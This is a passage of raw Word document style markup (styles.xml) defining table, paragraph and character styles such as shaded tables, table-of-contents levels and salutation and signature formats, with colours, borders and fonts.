          <w:right w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="accent5"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7E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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="007698" w:themeFill="accent6"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EA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E0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E5272"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E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272"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6E0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72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8727B" w:themeFill="accent1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="6872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6E0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94D2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94D22" w:themeFill="accent2"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D94D2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6E0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7A8B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7A8B0" w:themeFill="accent3"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A7A8B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6E0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29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29F" w:themeFill="accent4"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="00929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6E0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E527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E5272" w:themeFill="accent5"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="1E527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6E0F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69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7698" w:themeFill="accent6"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="00769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6E0F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341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:shd w:val="pct20" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NoSpacing">
    <w:name w:val="No Spacing"/>
    <w:uiPriority w:val="1"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalIndent">
    <w:name w:val="Normal Indent"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NoteHeading">
    <w:name w:val="Note Heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="NoteHeadingChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="NoteHeadingChar">
    <w:name w:val="Note Heading Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="NoteHeading"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="PlainText">
    <w:name w:val="Plain Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="PlainTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>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341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Salutation">
    <w:name w:val="Salutation"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="SalutationChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SalutationChar">
    <w:name w:val="Salutation Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Salutation"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Signature">
    <w:name w:val="Signature"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="SignatureChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="4252"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SignatureChar">
    <w:name w:val="Signature Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Signature"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleEmphasis">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="19"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="6EB0D9" w:themeColor="text1" w:themeTint="7F"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="Table3Deffects1">
    <w:name w:val="Table 3D effects 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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6E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:ind w:left="200" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableSimple1">
    <w:name w:val="Table Simple 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0"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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="27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E0F31"/>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rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="600"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="800"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="1000"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="1200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="1400"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC9">
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="1600"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Bodytextnospace">
    <w:name w:val="Body text nospace"/>
    <w:basedOn w:val="BodyText"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="00B341CC"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="23"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Contactheader">
    <w:name w:val="Contact header"/>
    <w:basedOn w:val="Bodytextnospace"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:b/>
      <w:sz w:val="23"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading">
    <w:name w:val="Light Shading"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000034A6"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="163D55" w:themeColor="text1" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E527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D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent1">
    <w:name w:val="Light Shading Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000034A6"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="4E555C" w:themeColor="accent1" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727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CDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="PlainTable5">
    <w:name w:val="Plain Table 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="45"/>
    <w:rsid w:val="006523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DAFD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DAFD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DAFD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DAFD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5234D"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="4" w:space="0" w:color="8ABFE0" w:themeColor="text1" w:themeTint="66"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="8ABFE0" w:themeColor="text1" w:themeTint="66"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="8ABFE0" w:themeColor="text1" w:themeTint="66"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="8ABFE0" w:themeColor="text1" w:themeTint="66"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="8ABFE0" w:themeColor="text1" w:themeTint="66"/>
